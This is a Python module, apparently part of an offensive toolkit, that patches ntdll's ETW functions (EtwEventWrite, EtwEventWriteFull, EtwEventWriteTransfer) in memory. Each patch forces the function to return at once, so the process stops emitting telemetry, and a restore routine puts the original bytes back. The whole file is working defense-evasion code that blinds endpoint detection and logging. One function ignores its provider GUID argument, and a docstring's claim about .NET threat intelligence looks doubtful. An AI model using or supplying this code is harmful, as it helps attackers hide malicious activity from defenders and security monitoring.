import ctypes
import os
from ctypes import wintypes

_ORIGINAL_BYTES = {}


def _patch_bytes(addr, patch):
    """Patch bytes at address, saving originals for restore."""
    if os.name != 'nt':
        return False
    k32 = ctypes.windll.kernel32
    if addr not in _ORIGINAL_BYTES:
        _ORIGINAL_BYTES[addr] = bytes((ctypes.c_ubyte * len(patch)).from_address(addr))
    old = wintypes.DWORD(0)
    k32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old))
    ctypes.memmove(addr, bytes(patch), len(patch))
    k32.VirtualProtect(addr, len(patch), old, ctypes.byref(old))
    return True


def _get_nt_export(name):
    """Get the address of an ntdll.dll export."""
    if os.name != 'nt':
        return 0
    return ctypes.windll.kernel32.GetProcAddress(ctypes.windll.ntdll._handle, name.encode())

_RET = bytes([0x48, 0x33, 0xC0, 0xC3])  # xor eax, eax; ret

def disable_etw_events():
    """Patch EtwEventWrite and EtwEventWriteFull to return STATUS_SUCCESS immediately."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    results = []
    for name in ('EtwEventWrite', 'EtwEventWriteFull'):
        addr = _get_nt_export(name)
        if addr and _patch_bytes(addr, _RET):
            results.append(f'[+] Patched {name}')
    return '\n'.join(results) if results else '[-] ETW events not patched'


def disable_etw_ti():
    """Patch EtwEventWriteTransfer (used by .NET CLR threat intelligence)."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    addr = _get_nt_export('EtwEventWriteTransfer')
    if not addr:
        return '[-] EtwEventWriteTransfer not found'
    return ('[+] Patched EtwEventWriteTransfer' if _patch_bytes(addr, _RET)
            else '[-] Failed to patch EtwEventWriteTransfer')


def patch_etw_provider(provider_guid):
    """Disable ETW for a specific provider GUID (patches all write callbacks)."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    results = list(filter(None, [disable_etw_events(), disable_etw_ti()]))
    return '\n'.join(results) if results else '[-] ETW providers not patched'


def restore_etw():
    """Restore original ETW bytes saved during patching."""
    if os.name != 'nt':
        return '[-] Windows-only operation'
    if not _ORIGINAL_BYTES:
        return '[-] No ETW patches to restore'
    n = sum(1 for a, o in list(_ORIGINAL_BYTES.items()) if _patch_bytes(a, o))
    _ORIGINAL_BYTES.clear()
    return f'[+] Restored {n} ETW patches'
